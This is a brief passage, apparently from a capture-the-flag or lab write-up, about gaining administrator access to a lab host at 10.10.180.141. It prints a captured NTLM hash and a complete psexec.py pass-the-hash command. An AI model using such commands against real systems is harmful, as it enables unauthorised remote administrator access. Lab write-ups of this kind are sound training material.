The preferred path is to use `psexec.py` to log in by "passing the hash," utilizing the hash we've discovered as the password
```
aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
```

Command we should run 
```
psexec.py "Administrator":@10.10.180.141 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
```

We could also use another tool if Psecec.py doesn't work in case
